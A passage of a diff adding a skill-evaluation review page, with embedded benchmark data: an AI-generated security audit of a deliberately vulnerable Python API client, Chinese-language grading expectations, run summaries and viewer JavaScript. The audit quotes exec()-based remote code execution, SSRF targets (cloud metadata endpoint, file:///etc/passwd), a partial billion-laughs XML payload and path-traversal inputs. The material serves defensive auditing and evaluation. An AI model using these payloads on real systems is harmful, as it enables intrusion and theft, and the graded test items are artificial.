server. The hardcoded JWT bearer token exposes internal API authentication to anyone with read access to the source code (developers, contractors, or anyone who acquires the repository).\n\n---\n\n## Findings\n\n### Finding 1: Remote Code Execution via `exec()` (Critical)\n\n**Severity:** Critical  \n**CWE:** CWE-94 (Code Injection)  \n**Location:** Lines 49-55, method `download_and_import`\n\n```python\ndef download_and_import(self, url):\n    \"\"\"Download and dynamically import a Python module from URL.\"\"\"\n    resp = self.session.get(url)\n    module_code = resp.text\n    namespace = {}\n    exec(module_code, namespace)\n    return namespace\n```\n\n**Description:**  \nThis method downloads arbitrary text content from a user-supplied URL and immediately executes it as Python code via `exec()`. There is no validation of the URL scheme, the domain, the contents of the response, or any form of sandboxing. This is a textbook remote code execution (RCE) vulnerability.\n\n**Attack scenario:**  \nAn attacker who can influence the `url` parameter (via any API endpoint, webhook, or configuration that feeds into this method) can point it to a URL hosting malicious Python code. When `exec()` runs, the attacker's code executes with the same privileges as the Python process, allowing them to:\n- Read/write arbitrary files\n- Exfiltrate environment variables and secrets\n- Establish reverse shells\n- Pivot to internal network resources\n- Persist malware on the system\n\n**Remediation:**\n- Remove this method entirely. Downloading and executing remote code is fundamentally unsafe.\n- If dynamic module loading is absolutely required, use `importlib` with a pre-approved whitelist of module names only (never from URLs).\n- If plugin loading is the goal, implement a strict plugin system with sandboxing (e.g., subprocess with restricted permissions, or a sandboxed interpreter) and cryptographic signature verification of all loaded code.\n\n---\n\n### Finding 2: Hardcoded JWT Bearer Token (Critical)\n\n**Severity:** Critical  \n**CWE:** CWE-798 (Hardcoded Credentials)  \n**Location:** Line 8\n\n```python\nINTERNAL_TOKEN = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret-token'\n```\n\n**Description:**  \nA JWT bearer token is hardcoded as a module-level constant. This token is used to authenticate all API requests (line 15: `self.session.headers['Authorization'] = INTERNAL_TOKEN`). Anyone with read access to the source repository can extract this credential and impersonate the application against the internal API.\n\n**Additional concerns:**\n- The header portion `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` decodes to `{\"alg\":\"HS256\",\"typ\":\"JWT\"}`. HS256 is a symmetric signing algorithm -- if the signing secret is also hardcoded or guessable, the token could be forged or manipulated.\n- The payload appears to be `secret-token` rather than a valid Base64-encoded JWT payload segment, suggesting this may be a placeholder. However, the pattern is dangerous regardless of whether it is a placeholder or a real token.\n\n**Remediation:**\n- Never hardcode secrets in source code. Use environment variables (`os.environ.get(\"INTERNAL_TOKEN\")`), a secrets manager (e.g., HashiCorp Vault, AWS Secrets Manager, Azure Key Vault), or a secure configuration file excluded from version control (`.gitignore`).\n- Rotate this token immediately since it has been exposed.\n- For JWT specifically, prefer RS256 (asymmetric) over HS256 (symmetric) to avoid shared-secret risks.\n\n---\n\n### Finding 3: Server-Side Request Forgery (SSRF) (High)\n\n**Severity:** High  \n**CWE:** CWE-918 (Server-Side Request Forgery)  \n**Location:** Lines 17-20 (`fetch_resource`), 22-25 (`forward_webhook`), 42-47 (`upload_file`), 49-55 (`download_and_import`)\n\n```python\ndef fetch_resource(self, resource_url):\n    \"\"\"Fetch an external resource by URL.\"\"\"\n    resp = self.session.get(resource_url, timeout=10)\n    ...\n```\n\n**Description:**  \nMultiple methods accept a URL from the caller and make HTTP requests to it without any validation of the target. An attacker can supply URLs pointing to:\n- Internal/private IP addresses (`127.0.0.1`, `10.x.x.x`, `192.168.x.x`, `169.254.x.x`)\n- Cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/` on AWS) to steal IAM credentials\n- Internal services that are not intended to be publicly accessible (databases, admin panels, configuration services)\n- File-based URLs (`file:///etc/passwd`) to read local files\n\nThe `requests` library does support `file://` URLs, so `file:///etc/passwd` would return the contents of that file (on Linux). The `forward_webhook` method additionally sends attacker-controlled JSON payloads to arbitrary internal endpoints.\n\n**Affected methods:**\n1. `fetch_resource(resource_url)` -- GET request to arbitrary URL\n2. `forward_webhook(target_url, payload)` -- POST request with attacker-controlled body to arbitrary URL\n3. `upload_file(file_url, local_path)` -- GET request to arbitrary URL, saves content to disk\n4. `download_and_import(url)` -- GET + `exec()` (also covered in Finding 1)\n\n**Remediation:**\n- Implement a strict URL allowlist (e.g., only `https://api.example.com/*`).\n- If dynamic URLs are required, validate and sanitize all URLs:\n  - Resolve the hostname to IP and reject private/internal IP ranges (RFC 1918, loopback, link-local, etc.).\n  - Restrict to HTTPS only (`https://`).\n  - Use a dedicated outbound proxy with network-level egress filtering.\n- Perform DNS resolution through a secure resolver that blocks internal addresses.\n- Never pass unsanitized user input directly to HTTP client methods.\n\n---\n\n### Finding 4: Sensitive Token Exposure in Logs/Print (High)\n\n**Severity:** High  \n**CWE:** CWE-532 (Insertion of Sensitive Information into Log Files)  \n**Location:** Line 30\n\n```python\nprint(f'Fetching user data from {url} with token {INTERNAL_TOKEN}')\n```\n\n**Description:**  \nThe `get_user_data` method logs the full `INTERNAL_TOKEN` (the JWT Bearer token) to stdout via `print()`. In production environments, stdout is typically captured by log aggregators, container runtimes (Docker, Kubernetes), CI/CD systems, and monitoring platforms. This means the authentication token is leaked into every log persistence layer.\n\n**Impact:**\n- The token appears in plaintext in application logs, systemd journal, Docker logs, Kubernetes pod logs.\n- Anyone with access to log aggregation tools (Splunk, ELK, CloudWatch, Datadog) can extract and reuse the token.\n- This is often a compliance violation (PCI-DSS, SOC 2, GDPR).\n\n**Remediation:**\n- Never log secrets, tokens, passwords, or API keys.\n- Use a logging library with built-in secret redaction (e.g., Python `logging` with a custom filter).\n- If you must log which token is in use, log only a truncated hash or token identifier:\n  ```python\n  token_id = hashlib.sha256(token.encode()).hexdigest()[:8]\n  logger.info(f\"Fetching user data from {url} with token id={token_id}\")\n  ```\n\n---\n\n### Finding 5: XML External Entity (XXE) Injection (Medium)\n\n**Severity:** Medium  \n**CWE:** CWE-611 (Improper Restriction of XML External Entity Reference)  \n**Location:** Lines 34-40, method `parse_xml_payload`\n\n```python\ndef parse_xml_payload(self, xml_data):\n    \"\"\"Parse an XML payload and extract fields.\"\"\"\n    root = ET.fromstring(xml_data)\n    ...\n```\n\n**Description:**  \nThe method uses Python's `xml.etree.ElementTree.fromstring()` to parse XML payloads. While `etree` is not vulnerable to XXE in Python 3.x (it does not process external entities by default), it is still a member of the `xml` module family known for security issues. More critically:\n\n1. **Billion Laughs / XML Bomb attack:** `etree` is vulnerable to entity expansion denial-of-service attacks. A small XML payload can expand to consume gigabytes of memory:\n   ```xml\n   <!DOCTYPE lolz [\n     <!ENTITY lol \"lol\">\n     <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n     ...\n   ]>\n   ```\n2. **No input validation:** The parsed XML structure and field values are not validated. Any XML is accepted, and all tags/text are blindly inserted into the result dictionary. This can lead to unexpected behavior downstream.\n\n**Remediation:**\n- Use `defusedxml` library, which is specifically designed to safely parse untrusted XML:\n  ```python\n  from defusedxml.ElementTree import fromstring\n  ```\n- If `defusedxml` is unavailable, explicitly disable entity expansion:\n  ```python\n  parser = ET.XMLParser(resolve_entities=False)\n  root = ET.fromstring(xml_data, parser=parser)\n  ```\n- Add input validation on the parsed XML: validate against a schema, enforce field name allowlists, and sanitize field values.\n\n---\n\n### Finding 6: Missing Input Validation on `user_id` (Low)\n\n**Severity:** Low  \n**CWE:** CWE-20 (Improper Input Validation)  \n**Location:** Lines 27-32, method `get_user_data`\n\n```python\ndef get_user_data(self, user_id):\n    \"\"\"Get user data by ID.\"\"\"\n    url = f'{self.base_url}/users/{user_id}'\n    ...\n```\n\n**Description:**  \nThe `user_id` parameter is interpolated directly into a URL string without any validation or sanitization. While this does not pose an injection risk against the URL construction itself (Python f-strings do not introduce injection), it does allow:\n- Path traversal within the API path: `user_id = \"../admin/delete-all\"` constructs `https://api.example.com/users/../admin/delete-all`\n- Injection of special characters: `user_id = \"123?admin=true\"` or `user_id = \"123#fragment\"`\n- Unexpected API calls if the ID is not restricted to expected formats\n\n**Remediation:**\n- Validate that `user_id` conforms to the expected format (e.g., UUID, integer, alphanumeric with defined length):\n  ```python\n  if not re.match(r'^[a-zA-Z0-9_-]+$', str(user_id)):\n      raise ValueError(\"Invalid user_id format\")\n  ```\n- URL-encode the `user_id` value to prevent path manipulation.\n- Use `urllib.parse.quote()` to safely encode dynamic URL path segments.\n\n---\n\n## Summary Table\n\n| # | Finding | Severity | CWE | Line(s) |\n|---|---------|----------|-----|---------|\n| 1 | Remote Code Execution via `exec()` | Critical | CWE-94 | 49-55 |\n| 2 | Hardcoded JWT Bearer Token | Critical | CWE-798 | 8 |\n| 3 | Server-Side Request Forgery (SSRF) | High | CWE-918 | 17-55 |\n| 4 | Sensitive Token Leaked via `print()` | High | CWE-532 | 30 |\n| 5 | XML External Entity / Billion Laughs | Medium | CWE-611 | 34-40 |\n| 6 | Missing `user_id` Validation | Low | CWE-20 | 27-32 |\n\n---\n\n## Overall Risk Assessment\n\n**Risk Level: Critical**\n\nThis module has fundamental security flaws that would allow an attacker to:\n1. Execute arbitrary code on the server (RCE via `exec()`)\n2. Authenticate to internal services (hardcoded token)\n3. Probe and attack internal network infrastructure (SSRF)\n4. Steal credentials from log files and monitoring systems (token in logs)\n\nThe code should not be deployed to any production or staging environment in its current state. A comprehensive remediation plan addressing all findings is required before any further use.\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b SSRF \u6f0f\u6d1e\u53d1\u73b0\uff08\u7528\u6237\u53ef\u63a7 URL \u88ab\u76f4\u63a5\u8bf7\u6c42\uff09", "passed": true, "evidence": "Finding #3: SSRF across 4 methods at lines 17-55"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801\u8ba4\u8bc1 Token \u53d1\u73b0", "passed": true, "evidence": "Finding #2: Hardcoded JWT Bearer Token at line 8"}, {"text": "\u62a5\u544a\u5305\u542b XXE/XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #5: XXE / Billion Laughs at lines 34-40"}, {"text": "\u62a5\u544a\u5305\u542b\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\uff08print \u8f93\u51fa token\uff09", "passed": true, "evidence": "Finding #4: Sensitive Token in Logs at line 30"}, {"text": "\u62a5\u544a\u5305\u542b\u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08exec() \u6267\u884c\u8fdc\u7a0b\u4e0b\u8f7d\u4ee3\u7801\uff09", "passed": true, "evidence": "Finding #1: RCE via exec() at lines 49-55"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u5199\u5165\u53d1\u73b0\uff08upload_file \u8def\u5f84\u7531 URL \u51b3\u5b9a\uff09", "passed": false, "evidence": "upload_file() is mentioned under SSRF but not flagged as a distinct insecure file write vulnerability"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u5177\u4f53\u7684\u6587\u4ef6\u540d\u548c\u884c\u53f7", "passed": true, "evidence": "Every finding includes specific line numbers in summary table"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "Every finding includes detailed remediation code"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": false, "evidence": "No numerical score/100 or A-F grade. Has 'Critical' risk level but no formal scoring system"}, {"text": "\u62a5\u544a\u6309\u4e25\u91cd\u7a0b\u5ea6\u6392\u5e8f", "passed": true, "evidence": "Order: Critical\u2192Critical\u2192High\u2192High\u2192Medium\u2192Low"}], "summary": {"passed": 8, "failed": 2, "total": 10, "pass_rate": 0.8}}}], "previous_feedback": {}, "previous_outputs": {}, "benchmark": {"metadata": {"skill_name": "code-audit", "skill_path": "D:/code/agent/miko/miko/miko/data/skills/code-audit", "executor_model": "deepseek-v4-pro", "analyzer_model": "deepseek-v4-pro", "timestamp": "2026-06-18T04:14:25Z", "evals_run": [0, 1, 2], "runs_per_configuration": 1}, "runs": [{"eval_id": 0, "eval_name": "webapp-flask", "configuration": "with_skill", "run_number": 1, "result": {"pass_rate": 1.0, "passed": 12, "failed": 0, "total": 12, "time_seconds": 46.1, "tokens": 24855, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b SQL \u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 131-167"}, {"text": "\u62a5\u544a\u5305\u542b SSTI \u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 171-201"}, {"text": "\u62a5\u544a\u5305\u542b\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 51-97"}, {"text": "\u62a5\u544a\u5305\u542b\u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 13-48"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801\u5bc6\u94a5\u53d1\u73b0", "passed": true, "evidence": "Lines 99-127"}, {"text": "\u62a5\u544a\u5305\u542b debug \u6a21\u5f0f\u53d1\u73b0", "passed": true, "evidence": "Lines 235-259"}, {"text": "\u62a5\u544a\u5305\u542b\u5f00\u653e\u91cd\u5b9a\u5411\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 266-301"}, {"text": "\u62a5\u544a\u5305\u542b XSS \u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 205-231"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u6587\u4ef6\u540d\u548c\u884c\u53f7", "passed": true, "evidence": "All findings include line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "All findings include fix code"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": true, "evidence": "Score 0/100, Rating F"}, {"text": "\u62a5\u544a\u6309\u4e25\u91cd\u7a0b\u5ea6\u6392\u5e8f", "passed": true, "evidence": "Critical\u2192High\u2192Low order maintained"}], "notes": []}, {"eval_id": 0, "eval_name": "webapp-flask", "configuration": "without_skill", "run_number": 1, "result": {"pass_rate": 0.833, "passed": 10, "failed": 2, "total": 12, "time_seconds": 0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b SQL \u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #1"}, {"text": "\u62a5\u544a\u5305\u542b SSTI \u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #4"}, {"text": "\u62a5\u544a\u5305\u542b\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #3"}, {"text": "\u62a5\u544a\u5305\u542b\u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #2"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801\u5bc6\u94a5\u53d1\u73b0", "passed": true, "evidence": "Finding #7"}, {"text": "\u62a5\u544a\u5305\u542b debug \u6a21\u5f0f\u53d1\u73b0", "passed": true, "evidence": "Finding #8"}, {"text": "\u62a5\u544a\u5305\u542b\u5f00\u653e\u91cd\u5b9a\u5411\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #6"}, {"text": "\u62a5\u544a\u5305\u542b XSS \u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #5"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u6587\u4ef6\u540d\u548c\u884c\u53f7", "passed": true, "evidence": "All findings have line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "All findings have remediation"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": false, "evidence": "No formal numerical score or A-F grade"}, {"text": "\u62a5\u544a\u6309\u4e25\u91cd\u7a0b\u5ea6\u6392\u5e8f", "passed": false, "evidence": "High after Medium, Critical after High - inconsistent ordering"}], "notes": []}, {"eval_id": 1, "eval_name": "data-processor", "configuration": "with_skill", "run_number": 1, "result": {"pass_rate": 1.0, "passed": 11, "failed": 0, "total": 11, "time_seconds": 0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b yaml.load() \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", "passed": true, "evidence": "Lines 59-78"}, {"text": "\u62a5\u544a\u5305\u542b pickle.load() \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", "passed": true, "evidence": "Lines 33-56"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801 API_TOKEN", "passed": true, "evidence": "Lines 13-30"}, {"text": "\u62a5\u544a\u5305\u542b MD5 \u5bc6\u7801\u54c8\u5e0c\u5f31\u70b9", "passed": true, "evidence": "Lines 147-174"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u968f\u673a\u6570\u751f\u6210", "passed": true, "evidence": "Lines 207-226"}, {"text": "\u62a5\u544a\u5305\u542b\u8def\u5f84\u904d\u5386\u6f0f\u6d1e", "passed": true, "evidence": "Lines 115-142"}, {"text": "\u62a5\u544a\u5305\u542b tarfile Zip Slip", "passed": true, "evidence": "Lines 82-112"}, {"text": "\u62a5\u544a\u5305\u542b chmod 0o777", "passed": true, "evidence": "Lines 177-203"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4ee3\u7801\u4f4d\u7f6e\u548c\u884c\u53f7", "passed": true, "evidence": "All findings include line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "All findings include fix code"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": true, "evidence": "Score 0/100, Rating F"}], "notes": []}, {"eval_id": 1, "eval_name": "data-processor", "configuration": "without_skill", "run_number": 1, "result": {"pass_rate": 0.909, "passed": 10, "failed": 1, "total": 11, "time_seconds": 0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b yaml.load() \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", "passed": true, "evidence": "Finding #2"}, {"text": "\u62a5\u544a\u5305\u542b pickle.load() \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", "passed": true, "evidence": "Finding #3"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801 API_TOKEN", "passed": true, "evidence": "Finding #1"}, {"text": "\u62a5\u544a\u5305\u542b MD5 \u5bc6\u7801\u54c8\u5e0c\u5f31\u70b9", "passed": true, "evidence": "Finding #7"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u968f\u673a\u6570\u751f\u6210", "passed": true, "evidence": "Finding #9"}, {"text": "\u62a5\u544a\u5305\u542b\u8def\u5f84\u904d\u5386\u6f0f\u6d1e", "passed": true, "evidence": "Finding #4"}, {"text": "\u62a5\u544a\u5305\u542b tarfile Zip Slip", "passed": true, "evidence": "Finding #5"}, {"text": "\u62a5\u544a\u5305\u542b chmod 0o777", "passed": true, "evidence": "Finding #6"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4ee3\u7801\u4f4d\u7f6e\u548c\u884c\u53f7", "passed": true, "evidence": "All findings include line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "All findings include remediation"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": false, "evidence": "No numerical score or A-F grade"}], "notes": []}, {"eval_id": 2, "eval_name": "api-client", "configuration": "with_skill", "run_number": 1, "result": {"pass_rate": 0.8, "passed": 8, "failed": 2, "total": 10, "time_seconds": 0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b SSRF \u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 93-177: two SSRF findings"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801\u8ba4\u8bc1 Token", "passed": true, "evidence": "Lines 63-89"}, {"text": "\u62a5\u544a\u5305\u542b XXE/XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165", "passed": false, "evidence": "No XXE finding for parse_xml_payload() at line 34"}, {"text": "\u62a5\u544a\u5305\u542b\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff08print token\uff09", "passed": true, "evidence": "Lines 181-214"}, {"text": "\u62a5\u544a\u5305\u542b\u4ee3\u7801\u6ce8\u5165 exec()", "passed": true, "evidence": "Lines 12-59"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u6587\u4ef6\u5199\u5165", "passed": false, "evidence": "upload_file() not flagged as file write issue"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u6587\u4ef6\u540d\u548c\u884c\u53f7", "passed": true, "evidence": "All findings include line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "All findings include fix code"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": true, "evidence": "Score 12/100, Rating F"}, {"text": "\u62a5\u544a\u6309\u4e25\u91cd\u7a0b\u5ea6\u6392\u5e8f", "passed": true, "evidence": "Critical\u2192High\u2192Low order"}], "notes": []}, {"eval_id": 2, "eval_name": "api-client", "configuration": "without_skill", "run_number": 1, "result": {"pass_rate": 0.8, "passed": 8, "failed": 2, "total": 10, "time_seconds": 0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b SSRF \u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #3: SSRF across 4 methods"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801\u8ba4\u8bc1 Token", "passed": true, "evidence": "Finding #2"}, {"text": "\u62a5\u544a\u5305\u542b XXE/XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165", "passed": true, "evidence": "Finding #5: XXE/Billion Laughs"}, {"text": "\u62a5\u544a\u5305\u542b\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff08print token\uff09", "passed": true, "evidence": "Finding #4"}, {"text": "\u62a5\u544a\u5305\u542b\u4ee3\u7801\u6ce8\u5165 exec()", "passed": true, "evidence": "Finding #1"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u6587\u4ef6\u5199\u5165", "passed": false, "evidence": "upload_file() only mentioned under SSRF, not standalone"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u6587\u4ef6\u540d\u548c\u884c\u53f7", "passed": true, "evidence": "All findings include line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "All findings include remediation"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": false, "evidence": "No numerical score or A-F grade"}, {"text": "\u62a5\u544a\u6309\u4e25\u91cd\u7a0b\u5ea6\u6392\u5e8f", "passed": true, "evidence": "Critical\u2192High\u2192Medium\u2192Low order"}], "notes": []}], "run_summary": {"with_skill": {"pass_rate": {"mean": 0.939, "stddev": 0.094, "min": 0.8, "max": 1.0}, "time_seconds": {"mean": 46.1, "stddev": 0, "min": 46.1, "max": 46.1}, "tokens": {"mean": 24855, "stddev": 0, "min": 24855, "max": 24855}}, "without_skill": {"pass_rate": {"mean": 0.848, "stddev": 0.044, "min": 0.8, "max": 0.909}, "time_seconds": {"mean": 0, "stddev": 0, "min": 0, "max": 0}, "tokens": {"mean": 0, "stddev": 0, "min": 0, "max": 0}}, "delta": {"pass_rate": "+0.09", "time_seconds": "+46.1", "tokens": "+24855"}}, "notes": ["webapp-flask: with_skill \u4ea7\u751f\u7ed3\u6784\u5316\u62a5\u544a\u542b\u8bc4\u5206\uff0c\u547d\u4e2d\u7387 100%\uff1bwithout_skill \u7f3a\u5c11\u5b89\u5168\u8bc4\u5206\u548c\u4e25\u683c\u6392\u5e8f \u2192 +16.7%", "data-processor: with_skill 100% \u547d\u4e2d\uff0c\u5305\u542b\u5b89\u5168\u8bc4\u5206\uff1bwithout_skill 90.9% \u7f3a\u5c11\u8bc4\u5206 \u2192 +9.1%", "api-client: \u53cc\u65b9 80% \u6301\u5e73\u3002with_skill \u9057\u6f0f XXE \u6f0f\u6d1e\u4f46\u7ed9\u51fa\u7ed3\u6784\u5316\u8bc4\u5206\uff1bwithout_skill \u53d1\u73b0 XXE \u4f46\u7f3a\u5c11\u5b89\u5168\u8bc4\u5206", "Skill \u6838\u5fc3\u4ef7\u503c\uff1a\u5f3a\u5236\u7ed3\u6784\u5316\u62a5\u544a\u6a21\u677f\uff08\u8bc4\u5206\u3001\u6392\u5e8f\u3001CWE\u5f15\u7528\uff09\uff0c\u786e\u4fdd\u8f93\u51fa\u4e00\u81f4\u6027\u548c\u5b8c\u6574\u6027", "Skill \u6539\u8fdb\u65b9\u5411\uff1a\u9700\u52a0\u5f3a XXE \u548c\u6587\u4ef6\u5199\u5165\u76f8\u5173\u6f0f\u6d1e\u7684\u68c0\u67e5\u63d0\u793a", "\u5b89\u5168\u8bc4\u5206\u65ad\u8a00\u662f\u6700\u5177\u533a\u5206\u5ea6\u7684\u6307\u6807 \u2014 without_skill \u5728 3 \u4e2a\u6d4b\u8bd5\u4e2d\u5747\u672a\u7ed9\u51fa\u8bc4\u5206"]}};
+
+    // ---- State ----
+    let feedbackMap = {};  // run_id -> feedback text
+    let currentIndex = 0;
+    let visitedRuns = new Set();
+
+    // ---- Init ----
+    async function init() {
+      // Load saved feedback from server ！ but only if this isn't a fresh
+      // iteration (indicated by previous_feedback being present). When
+      // previous feedback exists, the feedback.json on disk is stale from
+      // the prior iteration and should not pre-fill the textareas.
+      const hasPrevious = Object.keys(EMBEDDED_DATA.previous_feedback || {}).length > 0
+        || Object.keys(EMBEDDED_DATA.previous_outputs || {}).length > 0;
+      if (!hasPrevious) {
+        try {
+          const resp = await fetch("/api/feedback");
+          const data = await resp.json();
+          if (data.reviews) {
+            for (const r of data.reviews) feedbackMap[r.run_id] = r.feedback;
+          }
+        } catch { /* first run, no feedback yet */ }
+      }
+
+      document.getElementById("skill-name").textContent = EMBEDDED_DATA.skill_name;
+      showRun(0);
+
+      // Wire up feedback auto-save
+      const textarea = document.getElementById("feedback");
+      let saveTimeout = null;
+      textarea.addEventListener("input", () => {
+        clearTimeout(saveTimeout);
+        document.getElementById("feedback-status").textContent = "";
+        saveTimeout = setTimeout(() => saveCurrentFeedback(), 800);
+      });
+    }
+
+    // ---- Navigation ----
+    function navigate(delta) {
+      const newIndex = currentIndex + delta;
+      if (newIndex >= 0 && newIndex < EMBEDDED_DATA.runs.length) {
+        saveCurrentFeedback();
+        showRun(newIndex);
+      }
+    }
+
+    function updateNavButtons() {
+      document.getElementById("prev-btn").disabled = currentIndex === 0;
+      document.getElementById("next-btn").disabled =
+        currentIndex === EMBEDDED_DATA.runs.length - 1;
+    }
+
+    // ---- Show a run ----
+    function showRun(index) {
+      currentIndex = index;
+      const run = EMBEDDED_DATA.runs[index];
+
+      // Progress
+      document.getElementById("progress").textContent =
+        `${index + 1} of ${EMBEDDED_DATA.runs.length}`;
+
+      // Prompt
+      document.getElementById("prompt-text").textContent = run.prompt;
+
+      // Config badge
+      const badge = document.getElementById("config-badge");
+      const configMatch = run.id.match(/(with_skill|without_skill|new_skill|old_skill)/);
+      if (configMatch) {
+        const config = configMatch[1];
+        const isBaseline = config === "without_skill" || config === "old_skill";
+        badge.textContent = config.replace(/_/g, " ");
+        badge.className = "config-badge " + (isBaseline ? "config-baseline" : "config-primary");
+        badge.style.display = "inline-block";
+      } else {
+        badge.style.display = "none";
+      }
+
+      // Outputs
+      renderOutputs(run);
+
+      // Previous outputs
+      renderPrevOutputs(run);
+
+      // Grades
+      renderGrades(run);
+
+      // Previous feedback
+      const prevFb = (EMBEDDED_DATA.previous_feedback || {})[run.id];
+      const prevEl = document.getElementById("prev-feedback");
+      if (prevFb) {
+        document.getElementById("prev-feedback-text").textContent = prevFb;
+        prevEl.style.display = "block";
+      } else {
+        prevEl.style.display = "none";
+      }
+
+      // Feedback
+      document.getElementById("feedback").value = feedbackMap[run.id] || "";
